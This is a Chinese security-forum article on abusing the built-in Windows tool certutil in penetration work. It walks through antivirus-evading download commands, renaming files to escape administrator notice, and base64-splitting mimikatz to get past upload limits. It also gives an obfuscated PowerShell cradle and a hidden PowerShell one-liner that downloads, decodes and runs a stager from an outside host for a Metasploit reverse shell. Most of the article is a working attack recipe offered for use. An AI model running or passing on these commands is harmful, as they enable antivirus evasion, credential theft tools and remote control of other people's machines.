

# 关于certutil的探究 - 先知社区

关于certutil的探究

* * *

# 何为certutil

`certutil.exe` 是一个合法Windows文件，用于管理Windows证书的程序。

微软官方是这样对它解释的：

> Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。

但是此合法Windows服务现已被广泛滥用于恶意用途。

渗透中主要利用其 `下载`、`编码`、`解码`、`替代数据流` 等功能。

[![](assets/1701612219-d27d69287d2069471f3141b320594514.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152034-83510822-ca85-1.png)

这里我首先在命令行用`certutil -?`查看一下`certutil`所有的参数，这里只截图了一部分，接下来就总结一下最常用的几个关于`certutil`在内网渗透中的应用。

[![](assets/1701612219-b97b105d5404565f46c5d5b0d4e043c3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152036-849df9a6-ca85-1.png)

# certutil下载文件

一般我最常使用的`certutil`的功能就是在cmd环境下下载文件，因为`certutil`是windows自带的exe，所以在使用的时候会比其他exe或者vbs更加方便。但是因为在下载文件的过程中也会创建进程，所以也遭到了各大杀软的拦截。

一般使用`certutil`下载文件的命令为

```plain
certutil -urlcache -split -f http://ip/artifact.exe
```

这里介绍一下参数

*   `-f`  
    覆盖现有文件。  
    有值的命令行选项。后面跟要下载的文件 url。
*   `-split`  
    保存到文件。  
    无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。
*   `-URLCache`  
    显示或删除URL缓存条目。  
    无值的命令行选项。  
    （certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）

这里我在本地搭建一个http服务器，然后在配置了360的虚拟机cmd下进行下载

[![](assets/1701612219-024ead708bbe193779cb452d1d8b69f1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152037-853a2a74-ca85-1.png)

这里我为了更好的还原环境，先与虚拟机建立ipc连接后用psexec得到了命令行的cmd环境

这里我用常规的命令进行下载exe文件的操作遭到了av的拦截

[![](assets/1701612219-ef9e92ccabcc9cff5471e6b0a47d9460.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152040-86eef660-ca85-1.png)

如果超时没有操作的话就会显示拒绝访问

[![](assets/1701612219-fd8f87d255fe3d70d5e2724ef0082e17.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152041-87996a5a-ca85-1.png)

这里有两种方法对杀软进行`certutil`下载绕过，本质都是执行两次`certutil`

第一种方法是先执行一个单独的`certutil`，然后再执行下载exe的命令，可以看到这里已经能够成功下载

```plain
certutil

certutil -urlcache -split -f http://ip/artifact.exe
```

[![](assets/1701612219-896e7d07a5f33757c145e4c227120a2e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152043-888ba748-ca85-1.png)

另外一种方法就是使用windows自带的分隔符`&`和`|`，本质上跟第一种方法一样，相当于执行了两次`certutil`

```plain
certutil & certutil -urlcache -split -f http://ip/artifact.exe

certutil | certutil -urlcache -split -f http://ip/artifact.exe
```

[![](assets/1701612219-30ef8ad2e3f21e4d71a42aca3f0ce2e9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152045-89ab7f36-ca85-1.png)

这里也可以进行文件的重命名，如果你觉得这个文件名太过于明显容易被管理员发现就可以在下载的时候使用自己设置的名字生成exe

```plain
certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe nice.exe
```

[![](assets/1701612219-65c3da8850cd42f55eb63073b3b57a12.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152047-8ae9c4ca-ca85-1.png)

使用`certutil`下载文件有个弊端就是会产生缓存文件，用如下命令查看：

```plain
certutil -urlcache *
```

[![](assets/1701612219-74f2d7e9f02f1a97df7993763d7cf9d8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152049-8c001e0e-ca85-1.png)

执行删除缓存

```plain
certutil -urlcache * delete
```

[![](assets/1701612219-64f8709584164bbe48186861bfccb489.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152052-8ddf1d7e-ca85-1.png)

这里如果嫌麻烦的话可以在下载文件的时候加上一个`delete`参数，这样就省去了后面再来清理缓存的麻烦

```plain
certutil & certutil -urlcache -split -f http://172.20.10.4:8000/artifact.exe delete
```

# certutil base64加解密

之前在实战中就碰到过需要进行内网穿透的时候，代理软件上传不到靶机的情况

[![](assets/1701612219-c9f87b1904138d9f7a2d3035e02af2ab.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152053-8e63f40e-ca85-1.png)

这里我上传图片测试能够上传成功

[![](assets/1701612219-e89cd1858ea02c41685ad0bddb2c8d46.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152054-8ed30c4a-ca85-1.png)

本地也能够下载下来，但是就是到靶机上下载不下来，这里我判断应该是有av对上传文件大小进行了限制。这时候就可以使用`certutil`的`encode`和`decode`进行加解密。

[![](assets/1701612219-3282595411641c4475f282f7606cc417.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152055-8f7e2f58-ca85-1.png)

[![](assets/1701612219-2123133481d877c80774eb34c901ad9a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152056-9018e1f6-ca85-1.png)

`certutil`在内网渗透中进行base64编码是比较常用的。我们知道在内网中需要用到内网代理，一般都会用到nps或者frp，但是如果碰到有杀软限制上传文件大小的情况，这时候我们就可以使用先用encode编码分块上传再使用decode解密。

使用`encode`进行base64编码，然而大小还变大了，这里就可以考虑分成多块传输后再进行整合

[![](assets/1701612219-fbf92f507692eddbdb00999f4c2a63cb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152057-90c9d344-ca85-1.png)

这里我查看了一下生成的`mimikatz.txt`有2.7w行，所以这里我将其拆分为三块，这里顺便说一下快速选择大文件的指定行的操作

在notepad++编辑里面点击`开始/结束选择`，光标会定位到第一行

[![](assets/1701612219-64003153ee3addbc17616086388e1232.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152058-9174e43c-ca85-1.png)

再使用`ctrl + g`切换到行定位，选择要选中的行，因为这里我拆分成3块，所以这里我选择的是第10000行

[![](assets/1701612219-10e7a82890b86a610c300192f1a80aee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152059-91ed8dce-ca85-1.png)

再到编辑里面点一下`开始/结束选择`即可选中

[![](assets/1701612219-e1191633f2c51948d83ffb9b2ddcf48a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152100-928afc94-ca85-1.png)

这里我把`mimikatz.txt`拆分成了三个txt进行上传

[![](assets/1701612219-e30863add09a7004cd25b9ed3e957be1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152101-92f7182a-ca85-1.png)

上传到靶机的C盘目录

[![](assets/1701612219-af0d260864aafe1a87c33f98f8f87104.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152101-936f7644-ca85-1.png)

这里先把3个txt合并为一个txt`mimikatz.txt`

```plain
copy c:\*txt c:\mimikatz.txt    //把c盘根目录下的所有txt合并为mimikatz.txt
```

[![](assets/1701612219-62c77855bc71a3aeeb78a49b8a8f2c12.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152102-94073f10-ca85-1.png)

然后再使用`certutil`的`-decode`参数进行解密，生成`mimikatz.exe`

[![](assets/1701612219-66d52e8996a1167ef64467933bbeccac.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152104-94de226e-ca85-1.png)

运行一下看看已经合并成功了

[![](assets/1701612219-9a35bcdb97828c367e0f8bfc049fa54f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152105-95c0508a-ca85-1.png)

# certutil 校验hash值

有些时候官方网站的软件因为一些原因下架的情况下，我们就只能从一些非官方网站下载，而官方通常会把软件的hash值（一般是SHA256）公布出来，这时候我们就可以用certutil校验hash值的功能来检验一个软件是否被其他人修改过。拿原始软件的hash值和现在软件的hash进行比对，使用certutil获取hash值

```plain
certutil -hashfile mimikatz.exe MD5 //检验MD5

certutil -hashfile mimikatz.exe SHA1 //检验SHA1

certutil -hashfile mimikatz.exe SHA256 //检验SHA256
```

这里比较上传前后mimikatz.exe的MD5值

[![](assets/1701612219-d409a49d10a47e0bbca8d856af96fb9f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152106-965a9280-ca85-1.png)

# certutil配合powershell内存加载

这里我在本地实验因为环境变量的原因报错，之前在虚拟机实验的时候又忘记截图了，这里还是粗略的写一下大致实现过程

首先修改powershell策略为可执行脚本

[![](assets/1701612219-a187113cf58f822a45368f2a66ba179c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152107-96f3d710-ca85-1.png)

下载powershell混淆框架并执行

```plain
Import-Module .\Invoke-CradleCrafter.ps1Invoke-CradleCrafter
```

[![](assets/1701612219-41f7f23eb7f18f2070f0fd66ce39b475.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152108-978ddcf2-ca85-1.png)

使用msf生成一个payload，在本地起一个http服务器，放到http服务器的目录下

[![](assets/1701612219-1d4de19667cdd8500f110c26875aff1d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152109-984ad17c-ca85-1.png)

设置url为http服务器目录

```plain
set URL http://172.20.10.4:8000/key.txt
```

​ [![](assets/1701612219-a4b6e6e23c919c55f311ab6a36b1dfb2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210611152110-98d678ee-ca85-1.png)

使用以下几个命令进行初始化

```plain
Invoke-CradleCrafter> MEMORY

Choose one of the below Memory options:

[*] MEMORY\PSWEBSTRING          PS Net.WebClient + DownloadString method
[*] MEMORY\PSWEBDATA            PS Net.WebClient + DownloadData method
[*] MEMORY\PSWEBOPENREAD        PS Net.WebClient + OpenRead method
[*] MEMORY\NETWEBSTRING         .NET [Net.WebClient] + DownloadString method (PS3.0+)
[*] MEMORY\NETWEBDATA           .NET [Net.WebClient] + DownloadData method (PS3.0+)
[*] MEMORY\NETWEBOPENREAD       .NET [Net.WebClient] + OpenRead method (PS3.0+)
[*] MEMORY\PSWEBREQUEST         PS Invoke-WebRequest/IWR (PS3.0+)
[*] MEMORY\PSRESTMETHOD         PS Invoke-RestMethod/IRM (PS3.0+)
[*] MEMORY\NETWEBREQUEST        .NET [Net.HttpWebRequest] class
[*] MEMORY\PSSENDKEYS           PS SendKeys class + Notepad (for the lulz)
[*] MEMORY\PSCOMWORD            PS COM object + WinWord.exe
[*] MEMORY\PSCOMEXCEL           PS COM object + Excel.exe
[*] MEMORY\PSCOMIE              PS COM object + Iexplore.exe
[*] MEMORY\PSCOMMSXML           PS COM object + MsXml2.ServerXmlHttp
[*] MEMORY\PSINLINECSHARP       PS Add-Type + Inline CSharp
[*] MEMORY\PSCOMPILEDCSHARP     .NET [Reflection.Assembly]::Load Pre-Compiled CSharp
[*] MEMORY\CERTUTIL             Certutil.exe + -ping Argument

Invoke-CradleCrafter\Memory> CERTUTIL

[*] Name          :: Certutil
[*] Description   :: PowerShell leveraging certutil.exe to download payload as string
[*] Compatibility :: PS 2.0+
[*] Dependencies  :: Certutil.exe
[*] Footprint     :: Entirely memory-based
[*] Indicators    :: powershell.exe spawns certutil.exe certutil.exe 
[*] Artifacts     :: C:\Windows\Prefetch\CERTUTIL.EXE-********.pf AppCompat Cache

Invoke-CradleCrafter\Memory\Certutil> ALL


Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
```

到这里应该会显示如下代码

```plain
Invoke-CradleCrafter\Memory\Certutil\All> 1

Executed:
  CLI:  Memory\Certutil\All\1
  FULL: Out-Cradle -Url 'http://172.20.10.4/key.txt' -Cradle 17 -TokenArray @('All',1)

Result:
SV 1O6 'http://172.20.10.4/key.txt';.(Get-Command *ke-*pr*) ((C:\Windows\System32\certutil /ping (Get-Item Variable:\1O6).Value|&(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike'*and'}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike'*Com*e'}).Name).Invoke('*el*-O*',$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-Skip 2|&(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike'*and'}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike'*Com*e'}).Name).Invoke('*el*-O*',$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-SkipLa 1)-Join"`r`n")

Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
```

将混淆的代码保存到本地为`crt.txt`用`certutil`进行`encode`加密

```plain
certutil -encode crt.txt crt.cer
```

将`cer.cet`放入http服务器目录下，使用msf开启监听

```plain
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.10.11
lhost => 192.168.10.11
msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > run
```

然后靶机执行如下命令即可获得反弹session

```plain
powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\crt.cer (New‐Object Net.WebClient).DownloadString('http://172.20.10.4/crt.cer'); certutil ‐decode %APPDATA%\crt.cer %APPDATA%\stage.ps1 & start /b c
md /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\crt.cer
```

关于certutil + powershell的实战食用方法这里推荐Y4er师傅的一篇文章:  
[极限环境使用certutil+PowerShell配合Burp快速落地文件](https://xz.aliyun.com/t/8345 "极限环境使用certutil+PowerShell配合Burp快速落地文件")

[![](assets/1701612219-35a13e66e0fdeb79986278a803cc23f3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20220307152549-cff96bde-9de7-1.png)
